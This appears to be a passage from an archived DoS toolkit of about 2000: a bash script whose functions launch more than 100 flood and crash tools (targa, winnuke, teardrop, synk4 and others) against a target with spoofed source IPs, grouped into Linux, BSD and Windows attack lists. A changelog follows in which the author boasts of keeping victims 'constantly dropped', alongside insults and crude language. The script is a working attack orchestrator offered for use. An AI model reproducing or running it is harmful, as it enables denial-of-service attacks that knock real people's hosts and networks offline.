            "    ./bin/targa $DESTIP $DESTIP -t 0 -n `expr 2 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"targa\"",
            "    pingtest",
            "targa2 () {",
            "    echo \"Running combo attack (targa2)...\"",
            "    ./bin/targa2 $DESTIP $DESTIP -t 0 -n `expr 2 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"targa2\"",
            "    pingtest",
            "targa3 () {",
            "    echo \"Running packet generator (targa3)...\"",
            "    ./bin/targa3 $DESTIP -c `expr 3 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"targa3\"",
            "    pingtest",
            "trash () {",
            "    echo \"Running ICMP flooder (trash)...\"",
            "    ./bin/trash $SRCIP $DESTIP `expr 10000 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"trash\"",
            "    pingtest",
            "trash2 () { ",
            "    echo \"Running ICMP flooder (trash2)...\"",
            "    ./bin/trash2 $DESTIP `expr 1000 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"trash2\"",
            "    pingtest",
            "twinge () {",
            "    echo \"Running ICMP flooder (twinge)...\"",
            "    ./bin/twinge $DESTIP `expr 1000 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"twinge\"",
            "    pingtest",
            "udpdata () {",
            "    echo \"Running UDP flooder (udpdata)...\"",
            "    ./bin/udpdata \"127.0.0.1\" 19 $DESTIP 7 1>/dev/null 2>&1",
            "    LASTATTACK=\"udpdata\"",
            "    pingtest",
            "winfreez () {",
            "    echo \"Running ICMP flooder (winfreez)...\"",
            "    ./bin/winfreez $DESTIP $SRCIP `expr 15 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"winfreez\"",
            "    pingtest",
            "winnuke () {",
            "    echo \"Running OOB nuker (winnuke)...\"",
            "    ./bin/winnuke $DESTIP 1>/dev/null 2>&1",
            "    LASTATTACK=\"winnuke\"",
            "    pingtest",
            "killwin () {",
            "    echo \"Running OOB nuker (killwin)...\"",
            "    ./bin/killwin $DESTIP -p $OUTPUT -t `expr 1000 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"killwin\"",
            "    pingtest",
            "wingatecrash () {",
            "    echo \"Running wingate crasher (wingatecrasher)...\"",
            "    ./bin/wingatecrasher $DESTIP $OUTPUT 1>/dev/null 2>&1",
            "    LASTATTACK=\"wingatecrash\"",
            "    pingtest",
            "flushot () {",
            "    echo \"Running flooder (flushot)...\"",
            "    ./bin/flushot $SRCIP $DESTIP `expr 15000 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"flushot\"",
            "    pingtest",
            "NoPorts () {",
            "    sexy",
            "    kox",
            "    pimp",
            "    pimp2",
            "    moyari13",
            "    fawx",
            "    laser",
            "    oshare",
            "    gin",
            "    dosfrontpage",
            "    jaypee",
            "    udpflood",
            "    pepsi",
            "    arnup100",
            "    udpdata",
            "    onetwothreefour",
            "    opentear",
            "    doslinux",
            "    ascendfoo",
            "    beer",
            "    biffit",
            "    bloop",
            "    bonk",
            "    coke",
            "    ton",
            "    conseal",
            "    echok",
            "    foqerc",
            "    galt_gin",
            "    gewse",
            "    gewse5",
            "    jolt",
            "    overdrop",
            "    pirchslap",
            "    pong",
            "    rc8",
            "    spiffit",
            "    stuffit",
            "    ssping",
            "    akill2",
            "    ADMdnsfuckr",
            "    hiperbomb2",
            "    ntdns",
            "    quake2",
            "    rpk",
            "    rwhokill",
            "    synfulnone",
            "    syndropnone",
            "    targa",
            "    targa2",
            "    targa3",
            "    trash",
            "    trash2",
            "    twinge",
            "    winfreez",
            "    winnuke",
            "    flushot",
            "FullAttack () {",
            "    sexy",
            "    koc",
            "    kod",
            "    kox",
            "    flatline",
            "    moyari13",
            "    spender",
            "    arnup100",
            "    galt_gin",
            "    pirchslap",
            "    twinge",
            "    inetddos",
            "    dosfrontpage",
            "    onetwothreefour",
            "    doslinux",
            "    ascendfoo",
            "    beer",
            "    biffit",
            "    boink",
            "    bonk",
            "    bloop",
            "    hestra",
            "    gin",
            "    oshare",
            "    coke\t",
            "    conseal",
            "    echok",
            "    fawx",
            "    foqerc",
            "    gewse",
            "    gewse5",
            "    jaypee",
            "    jolt",
            "    bncex",
            "    smack",
            "    kkill",
            "    ircdkill",
            "    killinetd",
            "    locktcp",
            "    simping",
            "    killwin",
            "    land\t",
            "    latierra",
            "    misfrag",
            "    mutilate",
            "    paralyze3",
            "    orgasm",
            "    octopus",
            "    nestea",
            "    nestea2",
            "    newtear",
            "    teardrop",
            "    overdrop",
            "    pepsi",
            "    pimp",
            "    pimp2",
            "    pong\t",
            "    rape",
            "    rcon",
            "    rc8",
            "    spiffit",
            "    ssping",
            "    stuffit",
            "    dosprox",
            "    tesoiis",
            "    hanson",
            "    akill2",
            "    ADMdnsfuckr",
            "    hiperbomb2",
            "    ntdns",
            "    quake2",
            "    rpk",
            "    rwhokill",
            "    d0s",
            "    syndrop",
            "    synful",
            "    synhose",
            "    synk",
            "    synk4",
            "    trash",
            "    trash2",
            "    udpdata",
            "    udpflood",
            "    winfreez",
            "    wingatecrash",
            "    winnuke",
            "    mailer",
            "    mmsudos",
            "    binds",
            "    killwin",
            "    flushot",
            "    opentear",
            "    comatose",
            "    hell",
            "    laser",
            "    linuxicmp",
            "    slice3",
            "    sprite",
            "    stealth",
            "    ton",
            "    cocksuck",
            "    ruc",
            "    duy",
            "    raped",
            "    stream",
            "    targa",
            "    targa2",
            "    targa3",
            "LinuxAttack () {",
            "    sexy",
            "    flatline",
            "    trash",
            "    trash2",
            "    d0s",
            "    spender",
            "    syndrop",
            "    synful",
            "    synhose",
            "    synk",
            "    synk4",
            "    spiffit",
            "    biffit",
            "    galt_gin",
            "    bncex",
            "    smack",
            "    twinge",
            "    arnup100",
            "    gewse",
            "    gewse5",
            "    mutilate",
            "    paralyze3",
            "    orgasm",
            "    octopus",
            "    gin",
            "    inetddos",
            "    echok",
            "    doslinux",
            "    overdrop",
            "    nestea ",
            "    nestea2",
            "    newtear",
            "    teardrop",
            "    ircdkill",
            "    killinetd",
            "    akill2",
            "    ADMdnsfuckr",
            "    hiperbomb2",
            "    quake2",
            "    rpk",
            "    rwhokill",
            "    foqerc ",
            "    pong",
            "    rc8",
            "    stuffit",
            "    coke",
            "    ascendfoo",
            "    beer",
            "    pepsi",
            "    udpdata",
            "    udpflood",
            "    hestra",
            "    hell",
            "    laser",
            "    linuxicmp",
            "    slice3",
            "    sprite",
            "    stealth",
            "    ton",
            "    cocksuck",
            "    ruc",
            "    duy",
            "    opentear",
            "    stream",
            "    raped",
            "    targa",
            "    targa2",
            "    targa3 ",
            "BSDAttack () {",
            "    sexy",
            "    flatline",
            "    overdrop",
            "    newtear",
            "    teardrop",
            "    land",
            "    latierra",
            "    echok",
            "    biffit",
            "    spiffit",
            "    coke",
            "    beer",
            "    udpdata",
            "    udpflood",
            "    hestra",
            "    gin",
            "    bncex",
            "    smack",
            "    twinge",
            "    arnup100",
            "    trash",
            "    trash2",
            "    pepsi  ",
            "    rc8",
            "    stuffit",
            "    ircdkill",
            "    killinetd",
            "    pong",
            "    akill2",
            "    ADMdnsfuckr",
            "    hiperbomb2",
            "    rwhokill",
            "    spender",
            "    d0s",
            "    syndrop ",
            "    opentear",
            "    hell",
            "    laser",
            "    slice3",
            "    sprite",
            "    mutilate",
            "    paralyze3",
            "    orgasm",
            "    octopus",
            "    stealth",
            "    ton",
            "    cocksuck",
            "    ruc",
            "    duy",
            "    raped",
            "    stream",
            "    synful",
            "    synhose",
            "    synk",
            "    synk4",
            "    targa",
            "    targa2",
            "    targa3",
            "WinAttack () {",
            "    sexy",
            "    koc",
            "    kod",
            "    kox",
            "    flatline",
            "    moyari13",
            "    spender",
            "    bloop",
            "    twinge",
            "    galt_gin",
            "    arnup100",
            "    dosfrontpage",
            "    pirchslap",
            "    pimp",
            "    pimp2",
            "    jaypee",
            "    winfreez",
            "    winnuke ",
            "    killwin",
            "    rape",
            "    mutilate",
            "    paralyze3",
            "    orgasm",
            "    octopus",
            "    trash",
            "    trash2",
            "    conseal",
            "    hestra",
            "    gin",
            "    oshare",
            "    overdrop",
            "    jolt   ",
            "    bncex",
            "    smack",
            "    boink",
            "    bonk",
            "    echok",
            "    newtear",
            "    teardrop",
            "    land",
            "    latierra",
            "    conseal",
            "    misfrag",
            "    nestea",
            "    nestea2",
            "    simping",
            "    dosprox",
            "    tesoiis",
            "    hanson",
            "    akill2",
            "    ADMdnsfuckr",
            "    hiperbomb2",
            "    ntdns",
            "    quake2",
            "    rpk",
            "    syndrop",
            "    synful",
            "    synhose",
            "    synk",
            "    synk4",
            "    rcon",
            "    coke",
            "    pepsi",
            "    pong",
            "    rc8",
            "    stuffit",
            "    ssping",
            "    udpdata",
            "    udpflood",
            "    onetwothreefour",
            "    wingatecrash",
            "    flushot",
            "    opentear",
            "    mmsudos",
            "    mailer",
            "    comatose",
            "    hell",
            "    laser",
            "    slice3",
            "    sprite",
            "    stealth",
            "    ton",
            "    cocksuck",
            "    ruc",
            "    duy",
            "    raped",
            "    stream",
            "    targa",
            "    targa2",
            "    targa3",
            "cleaner () {",
            "    if [ \"$PORTLIST\" = \" \" ]; then",
            "        PORTLIST=",
            "    elif [ \"$LOGFILE\" = \" \" ]; then",
            "        LOGFILE=",
            "    fi",
            "    if [ -f ./output.txt ]; then",
            "        rm -f ./output.txt",
            "    fi",
            "    if [ -f ./svcname.txt ]; then",
            "        rm -f ./svcname.txt",
            "    fi",
            "    if [ -f ./output2.txt ]; then",
            "        rm -f ./output2.txt",
            "    fi",
            "    if [ -f ./datapool.bk ]; then",
            "        rm -f ./datapool.bk",
            "    fi",
            "nmapcheck () {",
            "    if [ -f /usr/bin/nmap ]; then",
            "\tNMAPDIR=\"/usr/bin/nmap\"",
            "    elif [ -f /usr/local/bin/nmap ]; then",
            "        NMAPDIR=\"/usr/local/bin/nmap\"",
            "    elif [ -f ./bin/nmap ]; then",
            "        NMAPDIR=\"./bin/nmap\"",
            "    else",
            "        echo \"NMAP not found, or not placed in either /usr/local/bin or /usr/bin.\"",
            "        echo \"Please copy NMAP to either directory and run this script again.\" ",
            "        exit 1",
            "    fi",
            "    NVER=`$NMAPDIR | grep \"nmap V.\" -w`",
            "    NVER1=`echo $NVER | cut -b11- | cut -b-6`",
            "    if [ \"$NVER1\" = \"30BETA\" ]; then",
            "\tNVER2=`echo $NVER | cut -b17- | cut -b-2`",
            "        if [ $NVER2 -lt 17 ]; then",
            "\t    echo \"Please download a newer copy of NMAP than you have at present.\"",
            "\t    echo \"NMAP version found: 2.30BETA$NVER2\"",
            "\t    echo \"NMAP version needed: at least 2.30BETA17\"",
            "\t    exit 1",
            "        fi",
            "    else",
            "\tNVER2=`echo $NVER | cut -b19- | cut -b-2`",
            "        if [ $NVER2 -lt 30 ]; then",
            "\t    echo \"Please download a newer copy of NMAP than you have at present.\"",
            "\t    echo \"NMAP version found: 2.$NVER2\"",
            "\t    echo \"NMAP version needed: at least 2.30BETA17\"",
            "\t    exit 1",
            "        fi",
            "    fi",
            "srcipgen () {",
            "if [ -z \"$SRCIP\" ]; then",
            "    RANDOM1=`echo \"$RANDOM\" | cut -b-2`",
            "    RANDOM2=`echo \"$RANDOM\" | cut -b-2`",
            "    RANDOM3=`echo \"$RANDOM\" | cut -b-2`",
            "    RANDOM4=`echo \"$RANDOM\" | cut -b-2`",
            "    SRCIP=`echo \"$RANDOM1.$RANDOM2.$RANDOM3.$RANDOM4\"`",
            "optionlist () {",
            "    printf \"%-30s%s\\n\" \".-----------------------------.\" \"------------------------------------------------.\"",
            "    printf \"%-30s%s\\n\" \"|Option                       |\" \"Setting                                         |\"",
            "    printf \"%-30s%s\\n\" \"\\`-----------------------------^\" \"------------------------------------------------'\"",
            "    printf \"%-30s \" \"Destination Host:\"",
            "    printf \"$DESTIP\\n\"",
            "    if [ -n \"$LOGFILE\" ]; then",
            "        echo \"Destination Host: $DESTIP\" >> \"$LOGFILE\"",
            "    fi   ",
            "    printf \"%-30s \" \"Source IP:\"",
            "    printf \"$SRCIP\\n\"",
            "    if [ -n \"$LOGFILE\" ]; then",
            "        echo \"Source IP: $SRCIP\" >> \"$LOGFILE\"",
            "    fi   ",
            "    printf \"%-30s \" \"Port Range:\"",
            "    printf \"$PORTLIST\\n\"",
            "    if [ -n \"$LOGFILE\" ]; then",
            "        echo \"Port Range: $PORTLIST\" >> \"$LOGFILE\"",
            "    fi   ",
            "    printf \"%-30s \" \"Logging:\"",
            "    if [ -z \"$LOGFILE\" ]; then",
            "\tprintf \"OFF\\n\"",
            "    else",
            "\tprintf \"ON to file $LOGFILE\\n\"",
            "    fi",
            "    printf \"%-30s \" \"Scan Only:\"",
            "    if [ $SCANONLY -eq 1 ]; then",
            "\tprintf \"ON\\n\"",
            "    else",
            "\tprintf \"OFF\\n\"",
            "    fi",
            "    printf \"%-30s \" \"Line Speed:\"",
            "    case \"$LINESPEED\" in",
            "    1)",
            "\tprintf \"Modem\\n\" ;;",
            "    2)",
            "\tprintf \"T1\\n\" ;;",
            "    4)",
            "\tprintf \"T3\\n\" ;;",
            "    6)",
            "\tprintf \"OC3\\n\" ;;",
            "    \"1 / 2\")",
            "\tprintf \"Slowass\\n\" ;;",
            "    esac",
            "    printf \"%-30s \" \"Continuous Attack:\"",
            "    if [ $KEEPGOING -eq 1 ]; then",
            "\tprintf \"ON\\n\"",
            "\tprintf \"%-30s \" \"\\\"Don't stop till they drop\\\":\"",
            "\tprintf \"OFF\\n\"",
            "    else",
            "        printf \"OFF\\n\"",
            "\tprintf \"%-30s \" \"\\\"Don't stop till they drop\\\":\"",
            "\tif [ $DONTSTOP -eq 1 ]; then",
            "    \t    printf \"ON\\n\"",
            "        else",
            "\t    printf \"OFF\\n\"",
            "        fi",
            "    fi\t",
            "    printf \"%-30s \" \"Wait for online host:\"",
            "    if [ $WATCHCON -eq 1 ]; then",
            "\tprintf \"ON\\n\"",
            "    else",
            "\tprintf \"OFF\\n\"",
            "    fi",
            "    printf \"%-30s \" \"# of simultaneous attacks:\"",
            "    printf \"$SIMULT\\n\"",
            "    printf \"%-30s \" \"Attacks in initial list:\"",
            "    if [ -z \"$ATTACKNM\" ]; then",
            "    printf \"ALL\\n\"",
            "    else",
            "    printf \"$ATTACKNM\\n\"",
            "    fi",
            "echo \"\"",
            "dropcheck () {",
            "    echo \"Host was dropped by $LASTATTACK.\"",
            "    if [ $SEXYRAN -eq 0 ]; then",
            "\tif [ ! -f ./datapool.db ]; then",
            "\t    echo \"##########################\" >> ./datapool.db",
            "\t    echo \"#  PLEASE DON'T EDIT!!!  #\" >> ./datapool.db",
            "\t    echo \"##########################\" >> ./datapool.db",
            "\t    echo $DESTIP >> ./datapool.db",
            "\t    echo $LASTATTACK >> ./datapool.db",
            "\telse",
            "\t    dickdripchk",
            "\t    if [ $UPDATEDB -eq 1 ]; then",
            "\t\tcat ./datapool.bk > ./datapool.db",
            "\t\trm -f ./datapool.bk",
            "\t    else",
            "\t\techo $DESTIP >> ./datapool.db",
            "\t\techo $LASTATTACK >> ./datapool.db",
            "\t    fi",
            "    fi",
            "    if [ -n \"$LOGFILE\" ]; then",
            "\techo \"Dropped by $LASTATTACK.\" >> \"$LOGFILE\"",
            "\techo \"-----------------------------\" >> \"$LOGFILE\"",
            "    fi",
            "    ./cleaner.sh 0",
            "    exit 0",
            "portchg () {",
            "    if [ -z \"$PORTLIST\" ]; then",
            "\tPORTLIST=\"1-1024\"",
            "    fi",
            "dickdripchk () {",
            "    if [ -f ./datapool.db ]; then",
            "\tUPDATEDB=0",
            "        x2=0",
            "        while read LINE5",
            "\t    if [ $x2 -eq 1 ]; then",
            "\t\tif [ \"$LASTATTACK\" != \"$LINE5\" ]; then",
            "\t\t    x3=0",
            "\t\t    while read LINE6",
            "\t\t    do",
            "\t\t\tif [ $x3 -eq 1 ]; then",
            "\t\t\t    echo \"$LASTATTACK\" >> ./datapool.bk",
            "\t\t\telse",
            "\t\t\t    echo \"$LINE6\" >> ./datapool.bk",
            "\t\t\tfi",
            "\t\t\tif [ \"$LINE6\" = \"$DESTIP\" ]; then",
            "\t\t\t    x3=`expr $x3 + 1`",
            "\t\t\tfi",
            "\t\t    done < \"./datapool.db\" ",
            "\t\t    UPDATEDB=1",
            "\t\tfi",
            "\t    fi",
            "\t    if [ \"$LINE5\" = \"$DESTIP\" ]; then",
            "\t\tx2=`expr $x2 + 1`",
            "\t    fi",
            "\tdone < \"./datapool.db\"",
            "    fi",
            "datapool/Changelog",
            "0100644",
            "0000000",
            "0000000",
            "00000044570",
            "07101435755",
            "013213",
            "ustar  ",
            "root",
            "root",
            "#April 25, 2000-",
            "#whelp i turn 17 tomorrow...heh tho i don't get any presents or have any ",
            "#parties cuz my parents are idiots (feel bad for me) but that's ok cuz ummm",
            "#well i dunno why but i don't really mind.  oh well...was very bored yesterday",
            "#so i scripted up a syn/udp/icmp flooder in perl..works pretty good...gets like",
            "#200kb/s thruput...ummm...mostly playin wit other shit right now...like",
            "#configgin muh ut server;)  MONKEY MASTERS RULE!!!!  oh..and a big fuck u to",
            "#the fuck ugly whores who took over #r00tabega today...must be some stupid",
            "#lameasses i've never heard of..ye all can wipe my ass...once again we return",
            "#to the little dick complex...i think their population is on the rise..we need",
            "#to curb this shit=P  doncha luv my signature \"...\" sentence structure? my",
            "#english teacher duz too. uuuuuuuuuuuuuuuhhhhhhh yeap welp later oh btw",
            "#since like uhh that's like my tool heh...like ummm..well that's 106 attacks",
            "#now...weeee;)  i'm on crack so uhh i'll be going now...  oh and uhhmm....bleh",
            "#just edited synk and synk4 so they stop kinda when u want em to;)",
            "#April 23, 2000-",
            "#erm...well..uhhh...just did some cool shit with the script today...#1 it'll",
            "#keep it from leavin some stray attacks rapin the machine u attacked... and #2,",
            "#it'll let u launch multiple simultaneous attacks.   Heh i find the 2nd part",
            "#VERY cool...for lamers who kept complaining when their box was bein owned by",
            "#the script \"someone's only packetin me at 50kb/s\"....welp this addition was",
            "#made for u bitchez;)  using the option `-t 4', i had throughput up to 600kb/s",
            "#...it was sum crazy packet output....gonna go into the sourcecode of each ",
            "#tool and change any sleeps to usleep(0)...so it'll packet as fast as the",
            "#computer can handle it=P  mmm...sexy and leet;P just updated all those sources",
            "#....BLAAAAZIN!!  throughput's up to around 270kb/s on a p133 with 16mb of",
            "#ram...faster computers can pump the shit out faster;)  there's now no lame",
            "#ass usleeps that slow the packetin down.  updated a bunch of the attacks so",
            "#they're used for a longer time... also added another option... -r, which",
            "#allows u to run a single attack instead of all of them...:)  dat's all for ",
            "#now...fixed some bugs too btw;)  happy packeting!;)   note to all lamers out",
            "#there...no i do NOT packet...just wrote this script and tested it out on my ",
            "#own machine...tho i have no problem with giving the script to others...let",
            "#them get busted for the lame stuff...not me=P white-hat's the way to go baybee!",
            "#:)  oh...also updated the script to v3.3 and changed the scan style to SYN",
            "#scanning....more stealthy;)",
            "#Early April 21, 2000-",
            "#whelp forgot i left a bug in the script from yesterday...so fixed that and ",
            "#added a new option..-c.  it keeps attacking the host even if it seems dropped.",
            "#i added this for the people who get lagged to hell after getting attacked...",
            "#(like a 90 sec ping time) so i didn't feel it was fair to just leave em alone",
            "#...u gotta finish em off=P  only way to stop this attack is to ^C it.  the",
            "#option is not available in the multiple attack script for obvious reasons=P",
            "#i think i might add some more attacks today as well.  ok just added 4 more",
            "#dos attacks...so now there's 105.  but i'm tired now...later=P",
            "#Later on april 20th, 2000-",
            "#weee...well i feel kinda sick but that's ok...been scriptin and hackin code",
            "#for bout 7 hours straight now.....so kinda tired...i seriously have no life,",
            "#but i added one more attack to the script...octopus....looking to find the",
            "#one by mixter...that should take bout 2 mins...btw i changed options on some",
            "#of the other attacks, namely the udp attacks... just added a new line speed",
            "#option...oc3=P  don't go destroyin the internet now;) also updated script",
            "#version to 3.2",
            "#April 20?, 2000-",
            "#bored as hell...so decided to hack some code=\\  jacked out 10 more dos attacks",
            "#tho...so that would bring us to 100=]...put in a sweet little ADM prog that",
            "#kills dns servers=P  dam...suck me balls i'm tired.  gonna go scoutin tomorrow",
            "#for new shit to do with my script...enybody who wants to help is welcome to.",
            "#btw..rootcore blows ass=]  yew all can suck my nads u bunch of lamers.  for",
            "#an hour i had to listen to your upper-cased ramblings..and it just showed",
            "#how incredibly stupid u are.  everyone pheer rootcore....check out their ",
            "#leet-ass website www.rootcore.com  (the logo and layout looks like my hairy ",
            "#ass) ...or if u don't like the web..go to their leet DALNET irc channel...",
            "#hey maybe if u change your nick to someone they know they'll op you!  and",
            "#pheer they're oc3 connections running from a blazing 486...i bet that puppy ",
            "#can spit out those packets like lightning...good thing they have an oc3 to",
            "#keep up with that beast of a machine.  Pheer their leet packeting skills,",
            "#tho i'm still waiting for them to drop a dialup.  They are \"31337 H4X0Rz\" as",
            "#they call themselves....even their spokesman, bobh4x0r who is the leetest ",
            "#sob i've seen in my life...he's got a 486 redhat 5.0 linux box that has...",
            "#TRIPWIRE(omg) and 24/7 security...and lets not forget, TCP SEQUENCE SPOOFING",
            "#PROTECTION....now i don't know who does the security there, maybe some",
            "#immigrant slaves they hired, but i think they probably know more about ",
            "#hacking that rootcore's bunch of lameasses do.  Pitiful 13 year old boys",
            "#with little dicks that whack off looking at nude pics of their grandparents..",
            "#But of most concern of all, is rootcore can hack your box with their oc3, and",
            "#even if you only have one account on the system, they'll say they have an",
            "#account on your system already and they already got your /etc/shadow file..",
            "#so they can take it back to their lab of 286's and try to decrypt it after",
            "#they used somebody's else's dictionary file.  Rootcore: they'll own your ass,",
            "#because they're leet bitches who know what they're talking about and have ",
            "#the hardware power to back it up;)  </rant>  and i'm spent...have fun with",
            "#the script;)  ",
            "#April 18, 2000-",
            "#yummy...i feel like i've accomplished something today...added 2 more attacks",
            "#to the script...d0s.pl (by ragnarox) and paralyze3.c (by xhostile)..though",
            "#i had to edit the source for that attack...i changed the default mode to ",
            "#close the connections...(has better effect on slower machines) and fixed the",
            "#code some...since the -t option didn't work.  i'm gonna set out on an adventure",
            "#to script some exploit concepts i find...eventually i wanna have 100 dos attacks,",
            "#just becuz it's a nice number=P  gonna work on cleanin up the code some b4",
            "#i move on to homework and such=]  later=P  mm yummy just fixed up the kox",
            "#and pimp attacks to make them use packet numbers=P  mmmm....i am just a sexy",
            "#ass bitch...just fixed up coke...had some lameass shit in there that made it",
            "#not work...now the code is purring like a baby=P  (just shows incredibly ",
            "#bored i am...i know just about nothing about c...can only make a stupid little",
            "#number game...yet i can fix other people's code..lol=P)  btw..i like learning",
            "#new things....if u wanna teach me sumtin...mail me and we'll talk;)  oh...",
            "#and found some \"hidden\" options in synful...they're not really hidden..but",
            "#if u don't type in the right shit it won't tell u all the options u can use..",
            "#so i implemented both types...i used one for the portless attacks...and used",
            "#the other one for the port-specific...did the same for one of the other syn",
            "#attacks as well...  mmm sexy...just fixed up a bunch of things in the script",
            "#fixed a bug in the logging...and just plain cleaned up the code=P  ",
            "#from all the work i did i feel like a 3.1 is good for that=P  nite nite time=]",
            "#Stormy April 17, 2000-",
            "#whelp..did some more scripting today...fixed a bug with the scan only option",
            "#in datamass.sh....and added a bunch more functionality to the ip generator.",
            "#now can create lists for class a, b, and c subnets=P...not that u'd need em=P",
            "#umm fixed a possible bug in the datamass.sh which would attack some ips",
            "#more than they needed to.  Also added an option for u guys who are elite",
            "#2400 baud hax0rs=P  now in addition to \"modem\" \"T1\" and \"T3\"...u have ",
            "#the \"slowass\" setting...ph34r it=P  i know i did some other shit...hrmm=\\",
            "#welp, greets to r00tabega...some nice guys there=]  until another time...",
            "#or until packetstorm's submission email starts working again...enjoy the",
            "#script!=] howly shiot....found a serious bug i forgot to take out while i was",
            "#testing the smart attacks...if u got an unreleased copy of this script",
            "#personally from me...it doesn't work right heh...after the first attack it'll",
            "#say it dropped em when it didn't=P whoopsie...well fixed that and some other",
            "#gay ass bugs....everything should be all fixed and dandy now=]",
            "#Bright sunny April 16, 2000-",
            "#ok...added 3 more dos attacks...had to edit the code on them a little to get",
            "#em to work...but now they do..so hurray!=P  umm...also updating the code for",
            "#the \"smart\" attacks...so that when someone gets killed with a certain attack,",
            "#the script checks to see if that's the same attack that killed em the last time.",
            "#if it is..then it doesn't do anything..but if it isn't, it updates the script",
            "#database so that the new attack will be run instead of the old one.  =]  that's",
            "#all for now....gotta get some work done=\\ ",
            "#EVEN LATER on April 15, 2000-",
            "#ok...did some more stuff....went through a bunch of code and cleaned it up",
            "#made a file with the functions for the scripts...so the code looks much",
            "#cleaner and its easier to update now....also created this file and separated",
            "#it from the script so it's easier to see...plus it keeps things more organized.",
            "#also added signal trapping...so the script doesn't wack out when u ctrl+c it.",
            "#nice clean exiting....=P welp i'm out...have fun with the script!",
            "#LATER on April 15, 2000-",
            "#ok enuff of this shit...i'm done with this for now...got the database thing",
            "#working fine....the actual way to do it was a lot easier than i was trying",
            "#to do....damn it took me so long to do too=\\  well the version number is still",
            "#3.0 cuz that was a bastard to get working...i also fixed a few bugs on the",
            "#way...have fun with it...i've got some work to do=P  later",
            "#Later on April 15, 2000-",
            "#DAMN! what a sekzy bitch i am=P  just implemented a database-like addition",
            "#to the script...mmmm this is sexy=] (greets to ecrofeht for the idea)...",
            "#the script now keeps a record of dropped hosts...and a string detailing",
            "#what the script should run the next time the script is run on that same host.",
            "#Interpretation: the script \"knows\" how to kill the host after it's done, and",
            "#when the script is run again, runs that attack on them FIRST...so no more long",
            "#waits for all the other attacks to complete if you're in a hurry and just",
            "#wanna beat the crap out of that lamer=P heh Dang...that took a while to set",
            "#up...just a bunch of copying and pasting mostly in the code...however that's",
            "#like a huge addition to the script and i had to make several modifications ",
            "#for it to work (like using the \";\" to combine longer timed attacks into one",
            "#line so the script can read it from the \"database\")...besides nobody else",
            "#has thought up something sexy like this...so i'm changing the script version",
            "#to 3.0 to reflect this=P",
            "#April 15, 2000-",
            "#De de de...added some more attacks today...now up to 85 DoS attacks...",
            "#i'm rather pleased with the response i've been getting from my script...",
            "#it's only been posted on 2 sites..and not even announced on them, yet still",
            "#around 400 people have downloaded it since i put it up about 2 weeks ago=P",
            "#What's next? Well..i'm planning on working on a graphical front-end to the",
            "#script (whazap zigzag_=]) ummm...added a check to see if u have the right",
            "#version of nmap(script uses newest version...i'm using 2.30BETA17 right now)",
            "#if u don't then i dunno what would happen but i'm guessing the script would",
            "#fuck up or say there was no ports open.  Also added hostname to IP resolution",
            "#so u no longer need to specify an IP addy...just added a host to IP ",
            "#resolution as well......=P de de dum de dum lengthened the ping time between",
            "#attacks since some might not be dead but just lagged to hell and back...",
            "#(changed since i saw a guy after getting attacked with the script have a",
            "#90 sec ping time=P)  Fixed a few bugs with the -x option....and fixed a",
            "#few lame logging errors(my fault...*doiink*) Busy with other things lately...",
            "#ah and not to forget...today's my 10 month anniversary with my gf...she's",
            "#such a cutie;)  i love you baby!=] whelp..that's all.  later all..enjoy the",
            "#script and if u have any questions/requests/bug reports, mail me at ",
            "#spender@exterminator.net.  thx=]  MONKEY MASTERS RULE!!!!!!;)  (whazap",
            "#ecrofeht=])",
            "#April 10, 2000-",
            "#Updated the code..fixed a bug where the script hung...added one more",
            "#dos attack...thas bout all=P",
            "#April 7, 2000-",
            "#Whelp....after some off time from the script...i did some testing...and found",
            "#out that it was kinda stupid to leave a computer alone if there were no ports",
            "#open but the host was up..so i found all the attacks that didn't need ports",
            "#and included them into their own list...now when u attack a system with no",
            "#ports......=]  have fun!=]  oh..and updated the ascii=P",
            "#April 1, 2000-",
            "#Made just a few minor changes this morning...the script now has a progress",
            "#bar-like thing for the timed attacks..and i put in a compile script for the",
            "#sources in case the bins don't work.  oh...and i fixed some more bugs...and ",
            "#umm...that's about it. oh and fixed up some shit where the multiple ip attack",
            "#gives more information.  just added some more attacks.....now we're up to",
            "#81!! still working on getting more=P  oh and now using printf function in",
            "#some areas instead of echo....since bash's echo doesn't like \\c....so now",
            "#the script no longer requires ksh.",
            "#March 31, 2000-",
            "#heh...while u all were slackin....i was scriptin....did a major overhaul of",
            "#the script today....lots of maintainance...added 4 more DoS attacks...now up",
            "#to 73=] still trying to add more....if u want any added that aren't in...",
            "#email em to spender@exterminator.net and include compiling instructions=P",
            "#...added some things to the logging...and the script now requires the newest",
            "#version of nmap, since the new one's output is different.  I also changed some",
            "#things with operating system detection.  oh...and the script now says and logs",
            "#what attack dropped each connection...especially useful for the multiple ip",
            "#attacks.  well that's about all...it's damn late and i'm tired=\\ oh..and",
            "#once again...greetz to the ss programming(and now ever more powerful hardware",
            "#;) ) team...heh u guys rock=P  strafgge and ecrofeht are muh bitches=P",
            "#and a small puke to www.securifyfocus.com for blowing off my submission...",
            "#of course they'll post much lamer scripts than this....  (packetstorm r0x;) )",
            "#March 29, 2000-",
            "#It never stops=]  some new options i put in today....lemme talk about all",
            "#of em.  well...lemme first clarify that while the cipgen.sh creates ips",
            "#for any c-class subnet, datamass.sh does not work solely off that...in other",
            "#words...you can put any ips in there you want and the script will work off",
            "#them.  when i get to it i'll make an option where u can specify any file",
            "#with a list of ips to use...but i just don't see a point for it right now.",
            "#Anywayz...on to the new options=P  there's an option for line speed...so",
            "#u lucky people with T3's can shell out more packets with the script than",
            "#somebody on a modem or T1.  There's also an option where u specify an IP,",
            "#and then have the program wait till they come online, so you can attack them.",
            "#(i love this one:)) especially fun when used with the -x option to kill them",
            "#every time and the -a option in the datamass.sh script to keep looping the",
            "#attack...basically it will keep someone constantly dropped (as long as your",
            "#box stays up heh=P  also a new option to only scan ports..for those days",
            "#when ur not feelin as naughty.  changed the ascii a little and tried to ",
            "#shove one more feature listing into the ascii as well.  and the script",
